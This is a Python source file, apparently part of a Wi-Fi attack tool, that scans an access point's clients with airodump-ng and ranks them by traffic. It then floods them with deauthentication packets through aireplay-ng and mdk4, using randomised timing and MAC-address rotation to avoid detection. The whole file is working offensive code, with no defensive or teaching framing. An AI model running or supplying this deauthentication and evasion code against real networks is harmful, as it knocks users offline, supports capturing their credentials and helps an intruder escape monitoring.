import subprocess
import time
import os
import re
import random
import threading
from pathlib import Path


CLIENT_CACHE_DIR = Path("/tmp/pegasus_client_cache")
CLIENT_CACHE_DIR.mkdir(parents=True, exist_ok=True)


class ClientTracker:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.client_history = {}
        self.current_index = 0
        self.max_retries_per_client = 2

    def scan_clients_with_traffic(self, bssid, channel, interface, scan_time=15):
        clients = []
        csv_file = f"/tmp/pegasus_traffic_{int(time.time())}"

        cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", csv_file,
            "--output-format", "csv",
            interface,
        ]
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(scan_time)
            proc.terminate()
            proc.wait(timeout=5)

            csv_path = f"{csv_file}-01.csv"
            if os.path.exists(csv_path):
                with open(csv_path) as f:
                    in_stations = False
                    for line in f:
                        if "Station MAC" in line or "BSSID" in line:
                            in_stations = True
                            continue
                        if in_stations and line.strip():
                            parts = [p.strip() for p in line.strip().split(",")]
                            if len(parts) >= 10:
                                mac = parts[0]
                                if not re.match(
                                    r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac
                                ):
                                    continue
                                if mac.upper() == bssid.upper():
                                    continue

                                frames = 0
                                try:
                                    frames = int(parts[3]) if parts[3] else 0
                                except (ValueError, IndexError):
                                    pass
                                packets = 0
                                try:
                                    packets = int(parts[4]) if parts[4] else 0
                                except (ValueError, IndexError):
                                    pass
                                traffic_score = frames + packets

                                clients.append(
                                    {
                                        "mac": mac,
                                        "frames": frames,
                                        "packets": packets,
                                        "traffic_score": traffic_score,
                                    }
                                )

            clients.sort(key=lambda c: c["traffic_score"], reverse=True)
            self.client_history[bssid] = {
                "clients": clients,
                "attempt_counts": {c["mac"]: 0 for c in clients},
                "retry_index": 0,
            }
            return clients
        except Exception:
            return []
        finally:
            for p in [
                f"{csv_file}-01.csv",
                f"{csv_file}-01.cap",
                f"{csv_file}-01.netxml",
            ]:
                try:
                    os.remove(p)
                except OSError:
                    pass

    def get_primary_client(self, bssid):
        info = self.client_history.get(bssid)
        if not info or not info["clients"]:
            return None
        return info["clients"][0]["mac"] if info["clients"] else None

    def get_next_client(self, bssid):
        info = self.client_history.get(bssid)
        if not info or not info["clients"]:
            return None

        for client in info["clients"]:
            mac = client["mac"]
            if info["attempt_counts"].get(mac, 0) < self.max_retries_per_client:
                info["attempt_counts"][mac] = info["attempt_counts"].get(mac, 0) + 1
                return mac

        info["retry_index"] = 0
        for c in info["clients"]:
            info["attempt_counts"][c["mac"]] = 0
        if info["clients"]:
            info["attempt_counts"][info["clients"][0]["mac"]] = 1
            return info["clients"][0]["mac"]
        return None

    def mark_client_failed(self, bssid, client_mac):
        info = self.client_history.get(bssid)
        if info and client_mac:
            info["attempt_counts"][client_mac] = info["attempt_counts"].get(
                client_mac, 0
            ) + 1

    def get_traffic_summary(self, bssid):
        info = self.client_history.get(bssid)
        if not info or not info["clients"]:
            return ""
        total = sum(c["traffic_score"] for c in info["clients"])
        if total == 0:
            return "no traffic"
        top = info["clients"][0]
        return f"top={top['mac'][:8]}.. score={top['traffic_score']}"


class StealthEngine:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.original_macs = {}

    def jittered_deauth(self, bssid, client_mac, interface, count=8):
        min_delay = 80
        max_delay = 240

        cmd = [
            "sudo",
            "aireplay-ng",
            "--deauth",
            str(count),
            "-a",
            bssid,
            "-c",
            client_mac,
            interface,
        ]
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            for _ in range(count):
                jitter = random.randint(min_delay, max_delay) / 1000.0
                time.sleep(jitter)
            proc.terminate()
            proc.wait(timeout=5)
            return True
        except Exception:
            return False

    def jittered_broadcast_deauth(self, bssid, interface, count=15):
        min_delay = 80
        max_delay = 240
        methods = [
            ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, interface],
            [
                "sudo",
                "aireplay-ng",
                "--deauth",
                str(count),
                "-a",
                bssid,
                "--ignore-negative-one",
                interface,
            ],
        ]
        try:
            r = subprocess.run(["which", "mdk4"], capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                methods.append(
                    ["sudo", "mdk4", interface, "d", "-b", bssid]
                )
        except Exception:
            pass

        for method in methods:
            try:
                proc = subprocess.Popen(
                    method, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                for _ in range(count):
                    jitter = random.randint(min_delay, max_delay) / 1000.0
                    time.sleep(jitter)
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
            except Exception:
                continue
        return True

    def rotate_mac(self, interface):
        try:
            if interface not in self.original_macs:
                r = subprocess.run(
                    ["macchanger", "-s", interface],
                    capture_output=True, text=True, timeout=5,
                )
                for line in r.stdout.splitlines():
                    m = re.search(r"Current MAC:\s+([0-9a-f:]{17})", line, re.I)
                    if m:
                        self.original_macs[interface] = m.group(1)
                        break
            result = subprocess.run(
                ["sudo", "macchanger", "-r", interface],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    m = re.search(r"New MAC:\s+([0-9a-f:]{17})", line, re.I)
                    if m:
                        print(f"   MAC rotated: {self.original_macs.get(interface, '?')} -> {m.group(1)}")
                        return True
            return False
        except Exception:
            return False

    def rotate_client_mac(self, interface):
        try:
            result = subprocess.run(
                ["sudo", "macchanger", "-A", interface],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except Exception:
            return False

    def restore_mac(self, interface):
        if interface in self.original_macs:
            try:
                subprocess.run(
                    ["sudo", "macchanger", "-p", interface],
                    capture_output=True, text=True, timeout=10,
                )
            except Exception:
                pass
